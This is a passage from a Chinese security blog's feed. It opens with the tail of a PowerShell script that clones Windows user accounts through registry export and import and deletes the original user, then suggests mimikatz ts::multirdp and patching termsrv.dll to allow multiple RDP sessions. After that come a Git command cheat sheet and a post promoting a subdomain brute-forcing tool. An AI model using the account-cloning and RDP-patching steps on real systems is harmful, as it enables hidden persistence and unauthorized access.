class="built_in">Write-Output</span> <span class="string">"[*] Get User <span class="variable">$u</span>'s  Key .."</span></div><div class="line">            <span class="variable">$ukey</span> = GetUser-Key <span class="variable">$u</span> |<span class="built_in">Out-String</span></div><div class="line">            <span class="built_in">Write-Output</span> <span class="string">"[*] Get User <span class="variable">$cu</span>'s  Key .."</span></div><div class="line">            <span class="variable">$cukey</span> = GetUser-Key <span class="variable">$cu</span> |<span class="built_in">Out-String</span></div><div class="line">            <span class="built_in">Write-Output</span> <span class="string">"[*] Clone User.."</span></div><div class="line">            Clone <span class="variable">$ukey</span> <span class="variable">$cukey</span></div><div class="line">            <span class="keyword">if</span>(<span class="variable">$tmp</span> <span class="nomarkup">-eq</span> <span class="number">1</span> )&#123;</div><div class="line">                <span class="built_in">Write-Output</span> <span class="string">"[*] Delete User.."</span></div><div class="line">                cmd /c <span class="string">"net User <span class="variable">$u</span> /del "</span> |<span class="built_in">Out-Null</span></div><div class="line">            &#125;<span class="keyword">else</span>&#123; <span class="built_in">Write-Output</span> <span class="string">"[*] Don't need to delete.."</span>&#125;</div><div class="line">            cmd /c <span class="string">"regedit /s <span class="variable">$env:temp</span>\<span class="variable">$u</span>.reg"</span></div><div class="line">            cmd /c <span class="string">"regedit /s <span class="variable">$env:temp</span>\out.reg"</span></div><div class="line">            <span class="built_in">Remove-Item</span> <span class="variable">$env:temp</span>\*.reg</div><div class="line">            <span class="built_in">Write-Output</span> <span class="string">"[*] Change reg privilege back !"</span></div><div class="line">            downreg</div><div class="line">            <span class="built_in">Write-Output</span> <span class="string">"[*] Done"</span></div><div class="line">        &#125;      </div><div class="line">    &#125;</div><div class="line">    Main</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>新建账号以后，可成功登陆系统<br><img src="http://ww1.sinaimg.cn/large/006xriynly1flc7rmrqn5j30ii07y0t2.jpg" alt=""><br>demo:<br><img src="http://ww1.sinaimg.cn/large/006xriynly1flc7ro2loxg30z50ikx6s.gif" alt=""><br>当然可以配合这个姿势来实现多用户登陆。</p><p>使用mimikatz.exe,执行ts::multirdp允许多用户远程登录</p><blockquote><p>ps:该方法在系统重启后失效，下次使用需要重新执行命令ts::multirdp,也可通过修改文件termsrv.dll实现永久修改</p></blockquote><p>end</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近做测试的时候发现，windows server2012 使用Mimikatz是直接抓不到明文密码的，而且，直接创建的账号登陆有时会碰到这个问题：&lt;br&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/006xriynly1flc7rmq8co
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Git项目管理常用命令</title>
    <link href="http://www.chabug.org/2017/11/08/Git-command/"/>
    <id>http://www.chabug.org/2017/11/08/Git-command/</id>
    <published>2017-11-08T09:23:34.000Z</published>
    <updated>2017-11-08T09:32:32.392Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为博客放到了GitHub上，采用hexo，所以免不了接触git命令。<br>而像我这种健忘的人，今天记得命令，明天就忘了，所以写一篇命令收集的。</p><h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><ul><li>远程仓库常用命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">检出仓库：$ git clone git://github.com/jQuery/jquery.git</div><div class="line">查看远程仓库：$ git remote -v</div><div class="line">添加远程仓库：$ git remote add [name] [url]</div><div class="line">删除远程仓库：$ git remote rm [name]</div><div class="line">修改远程仓库：$ git remote set-url --push [name] [newUrl]</div><div class="line">拉取远程仓库：$ git pull [remoteName] [localBranchName]</div><div class="line">推送远程仓库：$ git push [remoteName] [localBranchName]</div><div class="line">如果想把本地的某个分支test提交到远程仓库，并作为远程仓库的master分支，或者作为另外一个名叫test的分支，如下：</div><div class="line">$git push origin test:master // 提交本地test分支作为远程的master分支</div><div class="line">$git push origin test:test // 提交本地test分支作为远程的test分支</div></pre></td></tr></table></figure><ul><li>分支 (branch) 操作相关命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">查看本地分支：$ git branch</div><div class="line">查看远程分支：$ git branch -r</div><div class="line">创建本地分支：$ git branch [name] ----注意新分支创建后不会自动切换为当前分支</div><div class="line">切换分支：$ git checkout [name]</div><div class="line">创建新分支并立即切换到新分支：$ git checkout -b [name]</div><div class="line">删除分支：$ git branch -d [name] ---- -d选项只能删除已经参与了合并的分支，对于未有合并的分支是无法删除的。如果想强制删除一个分支，可以使用-D选项</div><div class="line">合并分支：$ git merge [name] ----将名称为[name]的分支与当前分支合并</div><div class="line">创建远程分支(本地分支push到远程)：$ git push origin [name]</div><div class="line">删除远程分支：$ git push origin :heads/[name] 或 $ gitpush origin :[name]</div><div class="line">*创建空的分支：(执行命令之前记得先提交你当前分支的修改，否则会被强制删干净没得后悔)</div><div class="line">$git symbolic-ref HEAD refs/heads/[name]</div><div class="line">$rm .git/index</div><div class="line">$git clean -fdx</div></pre></td></tr></table></figure><ul><li>版本 (tag) 操作相关命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">查看版本：$ git tag</div><div class="line">创建版本：$ git tag [name]</div><div class="line">删除版本：$ git tag -d [name]</div><div class="line">查看远程版本：$ git tag -r</div><div class="line">创建远程版本(本地版本push到远程)：$ git push origin [name]</div><div class="line">删除远程版本：$ git push origin :refs/tags/[name]</div><div class="line">合并远程仓库的tag到本地：$ git pull origin --tags</div><div class="line">上传本地tag到远程仓库：$ git push origin --tags</div><div class="line">创建带注释的tag：$ git tag -a [name] -m &apos;yourMessage&apos;</div></pre></td></tr></table></figure><ul><li>子模块 (submodule) 相关操作命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">添加子模块：$ git submodule add [url] [path]</div><div class="line">如：$git submodule add git://github.com/soberh/ui-libs.git src/main/webapp/ui-libs</div><div class="line"></div><div class="line">初始化子模块：$ git submodule init ----只在首次检出仓库时运行一次就行</div><div class="line">更新子模块：$ git submodule update ----每次更新或切换分支后都需要运行一下</div><div class="line"></div><div class="line">删除子模块：（分4步走哦）</div><div class="line">1) $ git rm --cached [path]</div><div class="line">2) 编辑“.gitmodules”文件，将子模块的相关配置节点删除掉</div><div class="line">3) 编辑“ .git/config”文件，将子模块的相关配置节点删除掉</div><div class="line">4) 手动删除子模块残留的目录</div><div class="line">5）忽略一些文件、文件夹不提交</div><div class="line"></div><div class="line">在仓库根目录下创建名称为“.gitignore”的文件，写入不需要的文件夹名或文件，每个元素占一行即可，如</div><div class="line">target</div><div class="line">bin</div><div class="line">*.db</div></pre></td></tr></table></figure><ul><li>其他常用命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">git branch 查看本地所有分支</div><div class="line">git status 查看当前状态</div><div class="line">git commit 提交</div><div class="line">git branch -a 查看所有的分支</div><div class="line">git branch -r 查看本地所有分支</div><div class="line">git commit -am &quot;init&quot; 提交并且加注释</div><div class="line">git remote add origin git@192.168.1.119:ndshow</div><div class="line">git push origin master 将文件给推到服务器上</div><div class="line">git remote show origin 显示远程库origin里的资源</div><div class="line">git push origin master:develop</div><div class="line">git push origin master:hb-dev 将本地库与服务器上的库进行关联</div><div class="line">git checkout --track origin/dev 切换到远程dev分支</div><div class="line">git branch -D master develop 删除本地库develop</div><div class="line">git checkout -b dev 建立一个新的本地分支dev</div><div class="line">git merge origin/dev 将分支dev与当前分支进行合并</div><div class="line">git checkout dev 切换到本地dev分支</div><div class="line">git remote show 查看远程库</div><div class="line">git add .</div><div class="line">git rm 文件名(包括路径) 从git中删除指定文件</div><div class="line">git clone git://github.com/schacon/grit.git 从服务器上将代码给拉下来</div><div class="line">git config --list 看所有用户</div><div class="line">git ls-files 看已经被提交的</div><div class="line">git rm [file name] 删除一个文件</div><div class="line">git commit -a 提交当前repos的所有的改变</div><div class="line">git add [file name] 添加一个文件到git index</div><div class="line">git commit -v 当你用－v参数的时候可以看commit的差异</div><div class="line">git commit -m &quot;This is the message describing the commit&quot; 添加commit信息</div><div class="line">git commit -a -a是代表add，把所有的change加到git index里然后再commit</div><div class="line">git commit -a -v 一般提交命令</div><div class="line">git log 看你commit的日志</div><div class="line">git diff 查看尚未暂存的更新</div><div class="line">git rm a.a 移除文件(从暂存区和工作区中删除)</div><div class="line">git rm --cached a.a 移除文件(只从暂存区中删除)</div><div class="line">git commit -m &quot;remove&quot; 移除文件(从Git中删除)</div><div class="line">git rm -f a.a 强行移除修改后文件(从暂存区和工作区中删除)</div><div class="line">git diff --cached 或 $ git diff --staged 查看尚未提交的更新</div><div class="line">git stash push 将文件给push到一个临时空间中</div><div class="line">git stash pop 将文件从临时空间pop下来</div><div class="line">git remote add origin git@github.com:username/Hello-World.git</div><div class="line">git push origin master 将本地项目给提交到服务器中</div><div class="line">git pull 本地与服务器端同步</div><div class="line">git push (远程仓库名) (分支名) 将本地分支推送到服务器上去。</div><div class="line">git push origin serverfix:awesomebranch</div><div class="line">git fetch 相当于是从远程获取最新版本到本地，不会自动merge</div><div class="line">git commit -a -m &quot;log_message&quot; (-a是提交所有改动，-m是加入log信息) 本地修改同步至服务器端 ：</div><div class="line">git branch branch_0.1 master 从主分支master创建branch_0.1分支</div><div class="line">git branch -m branch_0.1 branch_1.0 将branch_0.1重命名为branch_1.0</div><div class="line">git checkout branch_1.0/master 切换到branch_1.0/master分支</div><div class="line">du -hs</div><div class="line">mkdir WebApp</div><div class="line">cd WebApp</div><div class="line">git init</div><div class="line">touch README</div><div class="line">git add README</div><div class="line">git commit -m &apos;first commit&apos;</div><div class="line">git remote add origin git@github.com:daixu/WebApp.git</div><div class="line">git push -u origin master</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;因为博客放到了GitHub上，采用hexo，所以免不了接触git命令。&lt;br&gt;而像我这种健忘的人，今天记得命令，明天就忘了，所以写一篇命令收
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>工具收集之Layer4.1子域名挖掘机</title>
    <link href="http://www.chabug.org/2017/11/08/Layer/"/>
    <id>http://www.chabug.org/2017/11/08/Layer/</id>
    <published>2017-11-08T09:12:42.000Z</published>
    <updated>2017-11-08T09:21:08.970Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>实在是没啥可写了，收集点渗透测试中所需的几种工具。</p><h1 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h1><p><strong>Layer 子域名挖掘机4.1 全新重构+175万大字典</strong><br>优化详情：</p><ol><li>新起项目，代码全部重写，性能更优更稳定。</li><li>增加子端口探测功能，方便渗透测试。</li><li>增加DNS服务器切换和自定义，目前测试DNSPOD最快，个人测试最快达到了每秒3000+条验证，速度比上个版本增加5–10倍（速度会越跑越快）。</li><li>切换DNS服务器也可以避免进行大量DNS查询的时候影响正常上网。</li><li>对字典权重进行了调整，更容易命中的排在更前。</li><li>增加升级提醒，如果还有下个版本的话，会有提醒。<br>程序下载地址：<a href="https://pan.baidu.com/s/1dE4jgTr" target="_blank" rel="external">https://pan.baidu.com/s/1dE4jgTr</a> 密码: 9f5u<br>源码下载地址：<a href="https://pan.baidu.com/s/1qXURfzu" target="_blank" rel="external">https://pan.baidu.com/s/1qXURfzu</a><br>BTW：我也不知道360这个傻逼为什么会报窃取QQ密码的毒。<br><img src="http://ww1.sinaimg.cn/large/006xriynly1flasp3oj2mj316g0sq0ul.jpg" alt=""></li></ol><p><strong>Layer子域名挖掘机4.2纪念版 增加功能</strong></p><ol><li><p>增加获取web服务器信息的功能，如果在渗透过程中，担心软件自动访问web服务器会记录到web日志，可以关闭获取WEB服务器信息功能，但是如果干特别大的坏事，人家还是可以通过运营商的渠道来抓你。</p></li><li><p>增加线程控制，因有不少人反馈，开全速的时候，他们的小电脑会卡死，反正我电脑跑起来妥妥的，所以默认设置为全速。</p></li><li><p>增加右键复制所选项，胖子硬提出的需求。</p></li><li><p>修复了一个线程锁的问题，没修复前会引起程序崩溃。</p></li></ol><p>小TIPS：为了适应不同的分辨率，首次启动设置了全屏，可点击右上角的最大化按钮复位到我截图的这个小窗口。</p><p>程序地址：<a href="https://pan.baidu.com/s/1i5NpcJ7" target="_blank" rel="external">https://pan.baidu.com/s/1i5NpcJ7</a></p><p>源码地址：<a href="https://pan.baidu.com/s/1o8qAKYm" target="_blank" rel="external">https://pan.baidu.com/s/1o8qAKYm</a>  </p><p>作者<a href="http://www.cnseay.com/4452/" target="_blank" rel="external">Seay的博客</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;实在是没啥可写了，收集点渗透测试中所需的几种工具。&lt;/p&gt;
&lt;h1 id=&quot;程序&quot;&gt;&lt;a href=&quot;#程序&quot; class=&quot;headerl
      
    
    </summary>
    
    
  </entry>
  
</feed>
